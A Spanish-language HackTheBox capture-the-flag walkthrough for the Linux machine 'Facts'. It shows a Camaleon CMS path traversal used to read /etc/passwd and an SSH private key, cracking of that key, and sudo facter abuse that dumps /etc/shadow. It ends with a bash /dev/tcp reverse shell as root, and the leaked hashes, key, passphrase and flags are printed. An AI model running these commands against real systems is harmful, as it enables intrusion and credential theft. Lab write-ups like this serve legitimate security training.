---
hidden: true
icon: flag
---

# Facts HackTheBox (Easy)

## Contexto de la maquina

### Trayectoria Facts

<figure><img src="../../.gitbook/assets/trayectoria_facts.png" alt=""><figcaption></figcaption></figure>

### Descripción

**Facts** es una máquina **Linux** que combina explotación **web** y **post-explotación local**, pasando por un **CMS vulnerable**, abuso de **Path Traversal**, extracción de credenciales y una **escalada de privilegios vía sudo** mediante una mala configuración de `facter`.

**Objetivo del reto**

Obtener acceso inicial a través de la aplicación web, escalar a un usuario del sistema y finalmente comprometer el sistema como **root**.

**Tipo de máquina**

* Linux
* Web
* CMS
* Escalada local de privilegios

**Habilidades y técnicas evaluadas**

* Enumeración de servicios web
* Identificación de CMS y versiones
* Explotación de Path Traversal
* Abuso de credenciales SSH
* Cracking de claves privadas
* Escalada de privilegios con sudo
* Uso de GTFOBins

### Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/vuln1Facts.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln2Facts.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vuln3Facts.png" alt=""><figcaption></figcaption></figure>

## Escaneo de puertos

Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un escaneo más detallado sobre ellos para obtener versiones y scripts por defecto.

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 06:05 -0500
Nmap scan report for 10.129.28.189
Host is up (0.039s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://10.129.28.189:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189069358818F023
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 02 Feb 2026 11:05:32 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice 
ports,/Trinity.txt.bak</Resource><RequestId>189069358818F023</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 02 Feb 2026 11:05:16 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=2/2%Time=698084E7%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin
SF:\r\nDate:\x20Mon,\x2002\x20Feb\x202026\x2011:05:16\x20GMT\r\nContent-Le
SF:ngth:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF🔛\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFo
SF:urRequest,2CB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAccept-Ranges:\x20
SF:bytes\r\nContent-Length:\x20303\r\nContent-Type:\x20application/xml\r\n
SF:Server:\x20MinIO\r\nStrict-Transport-Security:\x20max-age=31536000;\x20
SF:includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b
SF:049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x
SF:20189069358818F023\r\nX-Content-Type-Options:\x20nosniff\r\nX-Xss-Prote
SF:ction:\x201;\x20mode=block\r\nDate:\x20Mon,\x2002\x20Feb\x202026\x2011:
SF:05:32\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>
SF:\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20Request\x20\(in
SF:valid\x20argument\)</Message><Resource>/nice\x20ports,/Trinity\.txt\.ba
SF:k</Resource><RequestId>189069358818F023</RequestId><HostId>dd9025bab4ad
SF:464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")
SF:%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.70 seconds
```

#### Observaciones relevantes

* **Puerto 22 (SSH)**: servicio activo, posible vector de acceso posterior.
* **Puerto 80 (HTTP)**: redirige a un dominio virtual (`facts.htb`).
* **Puerto 54321**: servidor HTTP desarrollado en **Go**, identificado como **MinIO**, similar a un servicio tipo **AWS S3**.

### Enumeración del servicio HTTP (puerto 80)

Antes de acceder al servicio web, añadimos el dominio virtual al archivo `/etc/hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>            facts.htb
```

Accedemos al dominio:

```
URL = http://facts.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260202121101.png" alt=""><figcaption></figcaption></figure>

Nos encontramos con una página aparentemente normal. Al revisar el contenido (posts, comentarios, imágenes), aparecen nombres de usuarios y referencias interesantes, pero no se observa ninguna vulnerabilidad directa.

Dado esto, decidimos centrar la atención en el **puerto 54321**, que aloja un servicio MinIO, y en la aplicación web accesible desde el dominio principal.

## CVE-2024-46987 (Path Traversal)

<figure><img src="../../.gitbook/assets/vulnCard1Facts.png" alt=""><figcaption></figcaption></figure>

Tras una enumeración manual inicial, realizamos **fuzzing web** con `gobuster` para identificar rutas ocultas.

### Gobuster

```shell
gobuster dir -u http://facts.htb/ -w <WORDLIST> -x html,txt,php -t 100 -r -k
```

Resultado:

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://facts.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 11125]
search.txt           (Status: 500) [Size: 7918]
index.txt            (Status: 500) [Size: 7918]
search.html          (Status: 200) [Size: 19212]
search.php           (Status: 200) [Size: 19207]
rss.txt              (Status: 200) [Size: 183]
rss.html             (Status: 200) [Size: 183]
rss                  (Status: 200) [Size: 183]
rss.php              (Status: 200) [Size: 183]
search               (Status: 200) [Size: 19187]
sitemap              (Status: 200) [Size: 3508]
sitemap.html         (Status: 200) [Size: 12139]
sitemap.txt          (Status: 500) [Size: 7918]
sitemap.php          (Status: 200) [Size: 2090]
index.html           (Status: 200) [Size: 11128]
index                (Status: 200) [Size: 11113]
en                   (Status: 200) [Size: 11109]
en.txt               (Status: 500) [Size: 7918]
en.html              (Status: 200) [Size: 11124]
en.php               (Status: 200) [Size: 11121]
page.txt             (Status: 500) [Size: 7918]
page                 (Status: 200) [Size: 19593]
page.html            (Status: 200) [Size: 19618]
page.php             (Status: 200) [Size: 19613]
welcome.html         (Status: 200) [Size: 11981]
welcome              (Status: 200) [Size: 11966]
admin                (Status: 200) [Size: 3896]
admin.html           (Status: 200) [Size: 3896]
admin.txt            (Status: 200) [Size: 3896]
admin.php            (Status: 200) [Size: 3896]
post.txt             (Status: 500) [Size: 7918]
post.html            (Status: 200) [Size: 11323]
post.php             (Status: 200) [Size: 11320]
post                 (Status: 200) [Size: 11308]
ajax.html            (Status: 200) [Size: 0]
ajax                 (Status: 200) [Size: 0]
ajax.txt             (Status: 200) [Size: 0]
ajax.php             (Status: 200) [Size: 0]
Index.html           (Status: 200) [Size: 11128]
Index                (Status: 200) [Size: 11113]
up                   (Status: 200) [Size: 73]
up.html              (Status: 200) [Size: 73]
up.txt               (Status: 200) [Size: 73]
up.php               (Status: 200) [Size: 73]
-                    (Status: 200) [Size: 11098]
404                  (Status: 200) [Size: 4836]
404.html             (Status: 200) [Size: 4836]
robots.txt           (Status: 200) [Size: 99]
robots.php           (Status: 200) [Size: 33]
robots.html          (Status: 500) [Size: 7918]
robots               (Status: 200) [Size: 33]
..................................
```

Entre la gran cantidad de rutas descubiertas, destaca especialmente el endpoint `admin`:

### Panel de administración

Accedemos a:

```
URL = http://facts.htb/admin
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260202123642.png" alt=""><figcaption></figcaption></figure>

Se presenta un **panel de administración** con opción para **crear una cuenta**. Procedemos a registrar un usuario y autenticarnos con las credenciales creadas.

Una vez dentro, accedemos a un **dashboard** donde se identifica claramente el CMS utilizado:

* **Camaleon CMS**
* **Versión 2.9.0**

<figure><img src="../../.gitbook/assets/Pasted image 20260202123749.png" alt=""><figcaption></figcaption></figure>

## Análisis de vulnerabilidades del CMS

Investigando vulnerabilidades asociadas a **Camaleon CMS**, encontramos referencias a:

* `CVE-2025-2304` → Escalada de privilegios (poca información pública)
* **`CVE-2024-46987`** → **Path Traversal**

URL = [CVE-2024-46987 Info](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)

Aunque el CVE indica afectación en versiones `2.8.0` a `2.8.2`, decidimos probar el **PoC**, ya que en muchos entornos estas validaciones no están correctamente parcheadas.

## CVE-2024-46987 – Path Traversal

<figure><img src="../../.gitbook/assets/vulnCard2Facts.png" alt=""><figcaption></figcaption></figure>

El vector de ataque consiste en abusar del endpoint:

```
/admin/media/download_private_file
```

URL = [Info Explotacion](https://github.com/advisories/GHSA-cp65-5m9r-vc2c)

Ejemplo genérico del `PoC`:

```
https:///admin/media/download_private_file?file=../../../../../../etc/passwd
```

Adaptado a nuestro entorno:

```
URL = http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

Al enviar esta petición, obtenemos correctamente el archivo `/etc/passwd`, confirmando que el **Path Traversal es explotable**.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

### Identificación de usuarios

Del contenido de `/etc/passwd` identificamos dos usuarios relevantes:

* `trivia`
* `william`

## Escalate user trivia

Para evitar realizar peticiones manuales desde el navegador, creamos un pequeño script en **bash** que automatiza la descarga de archivos arbitrarios usando nuestras cookies de sesión autenticada.

> pocFacts.sh

```bash
#!/bin/bash

# Verificar que se pasaron los argumentos necesarios
if [ $# -ne 2 ]; then
    echo "Uso: $0 <PATH> <NOMBRE_ARCHIVO_SALIDA>"
    echo "Ejemplo: $0 /etc/passwd passwd.txt"
    exit 1
fi

path="$1"
file="$2"

# Reemplaza <COOKIE1> y <COOKIE2> con tus cookies reales
COOKIE1="<COOKIE1>"
COOKIE2="<COOKIE2>"

# URL encode las barras en el path
encoded_path=$(echo "$path" | sed 's|/|%2F|g')

echo "Descargando: $path"
echo "Guardando como: $file"

# Ejecutar curl con las cookies
curl -s "http://facts.htb/admin/media/download_private_file?file=../../../../../../$encoded_path" \
  -H "Cookie: _factsapp_session=$COOKIE1; auth_token=$COOKIE2" \
  -o "$file"

# Verificar si la descarga fue exitosa
if [ $? -eq 0 ] && [ -s "$file" ]; then
    echo "✓ Descarga exitosa: $file ($(wc -c < "$file") bytes)"
else
    echo "✗ Error en la descarga"
    rm -f "$file"
    exit 1
fi
```

Este script permite descargar cualquier archivo indicando su ruta absoluta.

Probamos a descargar la flag de algun usuario. El usuario `trivia` no es accesible, pero el usuario `william` sí.

```shell
./pocFacts.sh /home/william/user.txt user.txt
```

Resultado:

```
Descargando: /home/william/user.txt
Guardando como: user.txt
✓ Descarga exitosa: user.txt (33 bytes)
```

Leyendo el archivo:

> user.txt

```
c98532e69e31af07377a5d136193cbeb
```

Esto confirma que tenemos acceso de lectura al home de `william`.

### Exfiltración de claves SSH

Probamos rutas habituales (`.ssh/id_rsa`, `.ssh/id_rsa.pub`) sin éxito. Sin embargo, al probar una clave **ED25519**, obtenemos resultados:

```shell
./pocFacts.sh /home/trivia/.ssh/id_ed25519 id_rsa
```

Resultado:

```
Descargando: /home/trivia/.ssh/id_ed25519
Guardando como: id_rsa
✓ Descarga exitosa: id_rsa (464 bytes)
```

La descarga se completa correctamente, lo que confirma la **exfiltración de la clave privada SSH** del usuario `trivia`.

> id\_rsa

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA/Yq4ba1
4UQgbH131IrO2YAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGpUsBXn41rPT2Wp
ikmBIWtI41aQdvIYpAwKmVuLvQb/AAAAoNBX/jh08P4Eem8O8F7G+1GMuwSbsaXH2+Xtht
k120iVpoLqA3sW2pz0VV5Ak5tg+DB8LT4h48OKGaOUUcUenj05bWJCIkfH3kNsmch21RBE
SPbIzzPdITr6Jmqwov+eTr1XAIF+QBPZ/97CpzNMk3quEQg64aUHN65tZRVpyggiC7bcd5
9OJKddb1zztKsmCuWZFmf4u/LS9NcipewKZEI=
-----END OPENSSH PRIVATE KEY-----
```

Observamos que la clave privada está **protegida por passphrase**, por lo que el siguiente paso es intentar **crackearla** para poder utilizarla en una conexión SSH.

## Crackeo de la clave privada

Convertimos la clave privada a un formato compatible con **John the Ripper** utilizando `ssh2john`:

```shell
ssh2john id_rsa > hash
```

Una vez generado el hash, lanzamos el ataque de fuerza bruta con un diccionario:

```shell
john --wordlist=<WORDLIST> hash
```

Resultado:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:55 0.02% (ETA: 2026-02-10 04:54) 0g/s 25.73p/s 25.73c/s 25.73C/s lance..colton
dragonballz      (id_rsa)     
1g 0:00:02:05 DONE (2026-02-02 07:41) 0.007962g/s 25.47p/s 25.47c/s 25.47C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

El crackeo es exitoso, obteniendo la **passphrase** de la clave privada.

### Acceso SSH (usuario trivia)

Con la clave descifrada, ajustamos los permisos y establecemos conexión por SSH como el usuario `trivia`:

```shell
chmod 600 id_rsa
ssh -i id_rsa trivia@<IP>
```

Introducimos la passphrase obtenida:

```
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb  2 12:45:44 PM UTC 2026

  System load:           0.01
  Usage of /:            72.6% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.28.189
  IPv6 address for eth0: dead:beef::250:56ff:fe94:3b88


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$ whoami
trivia
```

En este punto ya tenemos una **shell interactiva** como el usuario `trivia`.

## Escalate Privileges

<figure><img src="../../.gitbook/assets/vulnCard3Facts.png" alt=""><figcaption></figcaption></figure>

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Esto indica que el usuario `trivia` puede ejecutar el binario **`facter` como root sin contraseña**, lo cual resulta altamente crítico.

### Abuso de `facter` (GTFOBins)

`facter` permite cargar **facts personalizados** escritos en Ruby. Al poder ejecutarse con sudo, esto nos permite **leer archivos arbitrarios** y **ejecutar comandos** como `root`.

#### Lectura de archivos sensibles

Creamos un fact personalizado para leer el archivo `/etc/shadow`:

```shell
# Crear un fact personalizado que lea un archivo
mkdir -p /tmp/malicious_facts

# Crear un fact que lea /etc/shadow
cat > /tmp/malicious_facts/shadow.rb << 'EOF'
Facter.add('shadow') do
  setcode do
    File.read('/etc/shadow')
  end
end
EOF

# Ejecutar con sudo
sudo facter --custom-dir=/tmp/malicious_facts/ shadow
```

Resultado:

```
root:$y$j9T$7gs6EMa6c.zpFgKM3Grtz.$q8L7RyD.tdOf9DEhsqmEYBdKBrmxJ60ItpltO/x2nSB:20342:0:99999:7:::
daemon:*:20003:0:99999:7:::
bin:*:20003:0:99999:7:::
sys:*:20003:0:99999:7:::
sync:*:20003:0:99999:7:::
games:*:20003:0:99999:7:::
man:*:20003:0:99999:7:::
lp:*:20003:0:99999:7:::
mail:*:20003:0:99999:7:::
news:*:20003:0:99999:7:::
uucp:*:20003:0:99999:7:::
proxy:*:20003:0:99999:7:::
www-data:*:20003:0:99999:7:::
backup:*:20003:0:99999:7:::
list:*:20003:0:99999:7:::
irc:*:20003:0:99999:7:::
_apt:*:20003:0:99999:7:::
nobody:*:20003:0:99999:7:::
systemd-network:!*:20003::::::
usbmux:!:20003::::::
systemd-timesync:!*:20003::::::
messagebus:!:20003::::::
systemd-resolve:!*:20003::::::
pollinate:!:20003::::::
polkitd:!*:20003::::::
syslog:!:20003::::::
uuidd:!:20003::::::
tcpdump:!:20003::::::
tss:!:20003::::::
landscape:!:20003::::::
fwupd-refresh:!*:20003::::::
sshd:!:20338::::::
trivia:$y$j9T$1fYkuzD9.m5y7SwWSTUqh/$hb29dYfEthOUaEZr8D1GriIfSkeu8YeiI2WWxMmoiG0:20342:0:99999:7:::
william:$y$j9T$L/LMpuHMall7H5uzpS/mL1$L1EJ9y7BdcE10UIxBSow2eStbt1SefLToaTh4hDacD2:20461:0:99999:7:::
_laurel:!:20479::::::
```

La salida confirma que la lectura se realiza correctamente, demostrando el impacto del abuso de `sudo`.

#### Ejecución de comandos como root

Para verificar la ejecución de comandos, creamos otro fact que ejecute instrucciones arbitrarias:

```shell
cat > /tmp/malicious_facts/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    `id && whoami && hostname`
  end
end
EOF

sudo facter --custom-dir=/tmp/malicious_facts/ shell
```

Resultado:

```
uid=0(root) gid=0(root) groups=0(root)
root
facts
```

Esto confirma la **ejecución de comandos con privilegios de root**.

### Obtención de reverse shell como root

Para obtener una shell interactiva persistente, creamos un fact que lanza una **reverse shell**:

```shell
# Obtener shell reversa
cat > /tmp/malicious_facts/reverse.rb << 'EOF'
Facter.add('reverse') do
  setcode do
    `bash -c 'bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1'`
  end
end
EOF
```

Nos ponemos a la escucha en nuestra máquina:

```shell
nc -lvnp <PORT>
```

Ejecutamos el fact malicioso:

```shell
sudo facter --custom-dir=/tmp/malicious_facts/ reverse
```

Recibimos conexión entrante:

```
listening on [any] 7777 ...
connect to [10.10.15.41] from (UNKNOWN) [10.129.28.189] 52602
root@facts:/tmp/malicious_facts# whoami
whoami
root
```

Con esto se completa la escalada de privilegios, pasando de **lectura arbitraria de archivos** a **ejecución de comandos como root**, aprovechando una mala configuración de `sudo` junto con el uso inseguro de `facter`.

> root.txt

```
6c02640970dad29efec0931b797f68b9
```
